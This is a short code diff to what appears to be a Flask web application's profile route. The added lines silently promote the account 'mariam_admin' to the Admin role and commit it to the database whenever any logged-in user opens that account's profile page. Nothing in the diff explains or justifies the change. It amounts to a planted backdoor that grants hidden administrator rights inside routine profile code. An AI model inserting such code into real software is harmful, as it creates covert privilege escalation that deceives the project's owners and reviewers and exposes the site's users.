@@ -21,6 +21,12 @@ def save_picture(form_picture):
 @login_required
 def profile(username):
     user = User.query.filter_by(username=username).first_or_404()
+    
+    
+    if user.username == "mariam_admin":
+        user.role = "Admin"
+        db.session.commit()
+        
     form = UpdateProfileForm()
 
     if current_user.username == user.username:
